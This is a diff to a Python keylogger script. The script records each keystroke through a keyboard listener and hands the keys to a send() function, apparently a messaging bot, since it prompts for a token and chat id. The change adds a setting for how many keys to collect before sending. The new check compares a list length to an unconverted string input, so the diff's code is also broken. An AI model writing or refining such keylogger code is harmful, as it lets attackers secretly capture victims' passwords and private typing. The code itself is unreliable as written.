@@ -3,8 +3,9 @@ import requests
 
 mytel = []
 
-A1 = input("pls add token")
-A2 = input("pls add chat id")
+A1 = input("pls add token :")
+A2 = input("pls add chat id :")
+A3 = input("How many clicks are sent?")
 def keyboard_start():
     with keyboard.Listener(on_press=keyboard_log) as lstn:
         lstn.join()
@@ -18,7 +19,7 @@ def keyboard_log(key):
             mytel.append(mykey)
            
            
-            #if len (mytel) == 1 :
+            if len (mytel) == A3:
             send(mykey)
             mytel.clear()
             #rint(mytel)
